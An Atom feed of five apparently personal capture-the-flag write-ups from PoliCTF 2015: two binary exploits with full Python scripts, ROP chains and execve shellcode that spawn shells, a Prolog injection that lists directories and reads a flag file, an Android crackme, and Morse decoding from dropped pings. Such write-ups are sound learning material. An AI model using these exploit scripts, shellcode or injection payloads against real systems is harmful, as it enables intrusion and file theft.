<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-07-12T17:25:36+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
    <updated>2015-07-12T17:06:29+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>

<!--more-->


<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ ./johns-shuffle 
It all began as a mistake..


It all began as a mistake..


It all began as a mistake..
</code></pre>

<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>

<pre><code>    ... clear stack space ...
 8048f30: call   8048df0 &lt;unshuffle&gt;
 8048f35: mov    DWORD PTR [esp],0x804b078
 8048f3c: call   8048710 &lt;puts@plt&gt;
 8048f41: mov    eax,ds:0x804b0c0
 8048f46: mov    DWORD PTR [esp],eax
 8048f49: call   80486c0 &lt;fflush@plt&gt;
 8048f4e: mov    eax,ds:0x804b0a0
 8048f53: mov    DWORD PTR [esp+0x8],eax
 8048f57: mov    DWORD PTR [esp+0x4],0x44
 8048f5f: lea    eax,[esp+0x2c]
 8048f63: mov    DWORD PTR [esp],eax
 8048f66: call   80486e0 &lt;fgets@plt&gt;
</code></pre>

<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>

<pre><code>gdb-peda$ start
Temporary breakpoint 2, 0x08048ec2 in main ()
gdb-peda$ p system
$2 = {&lt;text variable, no debug info&gt;} 0xf7e9ac30 &lt;system&gt;
gdb-peda$ set *0xf7e9ac30=0xc3
gdb-peda$ c
It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

It all began as a mistake..

It all began as a mistake..
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
ECX: 0x4 
EDX: 0x80487a6 (&lt;difftime@plt+6&gt;:   push   0x88)
ESI: 0x0 
EDI: 0x0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
0004| 0xffffd5c4 ('A' &lt;repeats 27 times&gt;)
0008| 0xffffd5c8 ('A' &lt;repeats 23 times&gt;)
0012| 0xffffd5cc ('A' &lt;repeats 19 times&gt;)
0016| 0xffffd5d0 ('A' &lt;repeats 15 times&gt;)
0020| 0xffffd5d4 ('A' &lt;repeats 11 times&gt;)
0024| 0xffffd5d8 ("AAAAAAA")
0028| 0xffffd5dc --&gt; 0x414141 ('AAA')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
</code></pre>

<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>

<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>

<pre><code>080486d0 &lt;memcpy@plt&gt;:
 80486d0:   ff 25 1c b0 04 08       jmp    DWORD PTR ds:0x804b01c 
 80486d6:   68 20 00 00 00          push   0x20
 80486db:   e9 a0 ff ff ff          jmp    8048680 &lt;_init+0x2c&gt;
</code></pre>

<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>

<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('shuffle.polictf.it', 80))

    readtil('mistake..')

    rop = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    rop += p(0x8048696) # resolve -&gt; read (so we can read in `/bin/sh`)
    rop += p(0x804901d) # pppr
    rop += p(0)         # stdin
    rop += p(0x804b130) # free mem area
    rop += p(0x10)
    rop += p(0x8048726) # resolve -&gt; system
    rop += p(0x8048746) # resolve -&gt; exit (makes rasta_mouse happy!)
    rop += p(0x804b130) # arg for system; will contain /bin/sh in a few moments

    sendln(rop)

    readtil('mistake..')
    sendln(rop)
    readtil('mistake..')
    sendln(rop)

    sendln('/bin/sh')
    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
</code></pre>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ python poc.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cat /home/ctf/*
flag{rand0mizing_things_with_l0ve}
cat: /home/ctf/johnshuffle: Permission denied
</code></pre>

<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
    <updated>2015-07-12T16:45:04+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>

<!--more-->


<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>

<pre><code class="bash">Welcome to the jungle library mate! Try to escape!!

 r - read from library
 a - add element
 u - exit
a
Hey mate! Insert how long is the book title: 
10000
Hey you! what are you trying to do??
</code></pre>

<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>

<pre><code> 8048731: mov    eax,DWORD PTR [eax*4+0x804a060] ; 0x804a060 contains lengths
 8048738: mov    edx,eax
 804873a: mov    eax,DWORD PTR [ebp+0x8]         ; ptr to first book
 804873d: add    eax,edx                         ; add length of last string to it
 804873f: mov    DWORD PTR [esp],eax
 8048742: call   8048410 &lt;gets@plt&gt;              ; grab book title
</code></pre>

<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>

<p>Looking up a book title via the read function was done like this:</p>

<pre><code> 8048678: mov    eax,DWORD PTR [ebp-0xc]         ; number we just submitted
 804867b: mov    eax,DWORD PTR [eax*4+0x804a060] ; grab length of that book title
 8048682: mov    edx,eax
 8048684: mov    eax,DWORD PTR [ebp+0x8]         ; pointer to book titles on stack
 8048687: add    eax,edx                         ; add length of string so eax points to book title 
 8048689: mov    DWORD PTR [esp+0x4],eax
 804868d: mov    DWORD PTR [esp],0x8048893
 8048694: call   80483f0 &lt;printf@plt&gt;            ; dump title to user
</code></pre>

<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>

<pre><code>0xffffd1ab (address of book titles on stack) + 0xffffffe0 =&gt; 
gdb-peda$ x/10x $eax
0xffffd18b: 0x048614-&gt;ff    0xffd1ab&lt;-08    0x000002ff  0x15fd7c00
0xffffd19b: 0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
</code></pre>

<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys, time

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('library.polictf.it', 80))

    readtil('exit')

    # mem leak
    sendln('r')
    readtil('read:')
    sendln('-793')  
    # -793*4 = 0xfffff39c; 
    # 0x804867b &lt;read_from_library+58&gt;: mov eax,DWORD PTR [eax*4+0x804a060] 
    # -&gt; 0x80493fc == 0xffffffe0

    # leak stack addr
    time.sleep(0.1)
    buf = s.recv(20)
    stackaddr = struct.unpack('&lt;L', buf[6:10])[0]
    print hex(stackaddr+100)
    readtil('exit')

    sendln('a')
    readtil('title:')
    sendln('1')
    sendln('b')

    readtil('exit')

    sendln('a')
    readtil('title:')
    # 2**32 -&gt; integer overflow, 
    # we now have plenty of space to overwrite the saved return address
    sendln('4294967296') 

    # the reason i divided the nop sled is simple; for some reason, when the shellcode executes, 
    # it overwrites itself if it's at the end. this solves it; didn't debug it 
    sendln("\x90"*(0x30f-37)+"\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"+"A"*0x100+p(stackaddr+200)) # 0xffffd1ad -&gt; start of our buffer

    readtil('exit')
    sendln('u')

    t = telnetlib.Telnet()
    t.sock = s

    t.interact()

    s.close()

pwn()
</code></pre>

<p>And running it:</p>

<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-library$ python sn0w.py 

id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
cd /home/ctf
ls
challenge
flag
cat flag
flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
</code></pre>

<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
    <updated>2015-07-12T16:30:31+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>

<!--more-->


<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?

ERROR: Prolog initialisation failed:
ERROR: Syntax error: Unexpected end of clause
ERROR: hanoi() 
ERROR: ** here **
ERROR: .
</code></pre>

<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), hanoi(2). 
* Move top disk from a to c
* Move top disk from a to b
* Move top disk from c to b
</code></pre>

<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/*', S), write(S). 
[/home/ctf,/home/ubuntu]

# enumerate /home/ctf:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/*', S), write(S). %
[/home/ctf/haas]bas@tritonal:~$ 

# enumerate /home/ctf/haas:

bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), expand_file_name('/home/ctf/haas/*', S), write(S).  
[/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here]
</code></pre>

<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>

<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
Welcome to the Hanoi-as-a-Service cloud platform!
How many disks does your tower have?
0), open('/home/ctf/haas/jhknsjdfhef_flag_here', read, S), read_line_to_codes(S, T), write(T). 
[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
</code></pre>

<p>Back to python!</p>

<pre><code class="python">&gt;&gt;&gt; a = [102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
&gt;&gt;&gt; print "".join([chr(x) for x in a])
flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
</code></pre>

<p>50 points and first blood for Team Vulnhub.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Crack Me if You Can]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can/"/>
    <updated>2015-07-12T12:12:22+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can</id>
    <content type="html"><![CDATA[<p>Crack Me If You Can involved one of my least favorite things: Android APKs!</p>

<!--more-->


<p>I downloaded the APK and directly uploaded it to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>. Among the decompiled files I found <code>src/it/politctf/LoginActivity.java</code> and three other java files. After inspecting <code>LoginActivity.java</code>, I found this function:</p>

<pre><code class="java">private boolean a(String s)
    {
        if (s.equals(c.a(it.polictf2015.b.a(it.polictf2015.b.b(it.polictf2015.b.c(it.polictf2015.b.d(it.polictf2015.b.g(it.polictf2015.b.h(it.polictf2015.b.e(it.polictf2015.b.f(it.polictf2015.b.i(c.c(c.b(c.d(getString(0x7f0c0038))))))))))))))))
        {
            Toast.makeText(getApplicationContext(), getString(0x7f0c003c), 1).show();
            return true;
        } else
        {
            return false;
        }
    }
</code></pre>

<p>Interesting. It performs a bunch of operations on a string, which I don&rsquo;t know yet. However, on of the operations is this one:</p>

<pre><code class="java">    public static String c(String s)
    {
        return s.replace("buga", "Goo");
    }
</code></pre>

<p>So I did the following:</p>

<pre><code class="bash">$ strings crack-me-if-you-can.apk  |grep buga
ee[[c%l][c{g}[%{\%Mc%spdgj=]T%aat%=O%bRu%sc]c%ti[o%n=Wcs%=No[t=T][hct%=buga[d=As%=W]e=T%ho[u%[%g]h%t[%}%
</code></pre>

<p>I now had the string and all the operations on the string:</p>

<pre><code class="java">public class b
{

    public static String a(String s)
    {
        return s.replace("c", "a");
    }

    public static String b(String s)
    {
        return s.replace("%", "");
    }

    public static String c(String s)
    {
        return s.replace("[", "");
    }

    public static String d(String s)
    {
        return s.replace("]", "");
    }

    public static String e(String s)
    {
        return s.replaceFirst("\\{", "");
    }

    public static String f(String s)
    {
        return s.replaceFirst("\\}", "");
    }

    public static String g(String s)
    {
        return s.replaceFirst("c", "f");
    }

    public static String h(String s)
    {
        return s.replaceFirst("R", "f");
    }

    public static String i(String s)
    {
        return s.replace("=", "_");
    }
}

public class c
{

    public static String a(String s)
    {
        return s.replace("aa", "ca");
    }

    public static String b(String s)
    {
        return s.replace("aat", "his");
    }

    public static String c(String s)
    {
        return s.replace("buga", "Goo");
    }

    public static String d(String s)
    {
        return s.replace("spdgj", "yb%e");
    }
}
</code></pre>

<p>Using this string, I started working my way back, applying all the operations of <code>a.java</code>, <code>b.java</code> and <code>c.java</code> by hand. Finally, I ended up with the string <code>flag{Maybe_This_Obfuscation_Was_Not_That_Good_As_We_Thought}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John the Dropper]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper/"/>
    <updated>2015-07-12T12:00:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper</id>
    <content type="html"><![CDATA[<p>John the Dropper was an interesting 100 point challenge. I&rsquo;d love to see how it was implemented!</p>

<!--more-->


<p>We&rsquo;re given a host, <code>dropper.polictf.it</code>. It has no open ports, but the challenge description mentioned that John did not need ports to communicate. I left this challenge for a while, focusing on others. When I got back, superkojiman noticed that pinging this host dropped a lot of packets. He saw patterns: sometimes one packet dropped, sometimes three in a row. This made me think of Morse immediately.</p>

<p>I started pinging the host and grabbed the output of <code>ping</code>:</p>

<pre><code>PING dropper.polictf.it (52.18.119.20) 56(84) bytes of data.
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=1 ttl=50 time=23.8 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=3 ttl=50 time=24.2 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=5 ttl=50 time=24.1 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=7 ttl=50 time=23.8 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=8 ttl=50 time=23.9 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=12 ttl=50 time=23.8 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=16 ttl=50 time=24.2 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=20 ttl=50 time=23.9 ms
64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=21 ttl=50 time=24.0 ms
...snip...
</code></pre>

<p>As you can see, request 2, 4 and 6 are dropped. With the following one-liner, I extracted the icmp_req numbers:</p>

<pre><code class="bash">cat pings.txt |awk '{print $6}' |awk '{split($0,a,"="); print a[2]}' &gt; sequence.txt
</code></pre>

<p>I wrote a python script to translate the drops to Morse:</p>

<pre><code class="python">seq = []

with open('sequence.txt') as f:
    lines = f.readlines()
    for l in lines:
        seq.append(int(l))
    f.close()

msg = ""
for i in range(len(seq)-2):
    if seq[i+1] - seq[i] - 1 == 0:
        count += ' '
    if seq[i+1] - seq[i] - 1 == 1:
        msg += '.'
    if seq[i+1] - seq[i] - 1 == 3:
        msg += '-'
print msg
</code></pre>

<p>Which yielded:</p>

<pre><code>... --- ...    - .... .. ...    .. ...    - .... .    ..-. .-.. .- --. .--.- .. - -....- .. ... -....- -. . ...- . .-. -....- - --- --- -....- .-.. .- - . -....- ..-. --- .-. -....- .- -....- -.. .-. --- .--. .--.--   
</code></pre>

<p>The first three characters spell out &ldquo;SOS&rdquo;. I translated the rest by hand and found: <code>SOS THIS IS THE FLAG?IT?IS?NEVER?TOO?LATE?FOR?A?DROP?</code>. I couldn&rsquo;t really figure out the characters that are marked <code>?</code>. I guessed them to be underscores, but in the end, <a href="https://duckduckgo.com/?q=...+---+...++++-+....+..+...++++..+...++++-+....+.++++..-.+.-..+.-+--.+.--.-+..+-+-....-+..+...+-....-+-.+.+...-+.+.-.+-....-+-+---+---+-....-+.-..+.-+-+.+-....-+..-.+---+.-.+-....-+.-+-....-+-..+.-.+---+.--.+.--.--++++morse&amp;ia=answer">duckduckgo</a> came to the rescue. The final flag was lowercase: <code>flag{it-is-never-too-late-for-a-drop}</code>.</p>
]]></content>
  </entry>
  
</feed>
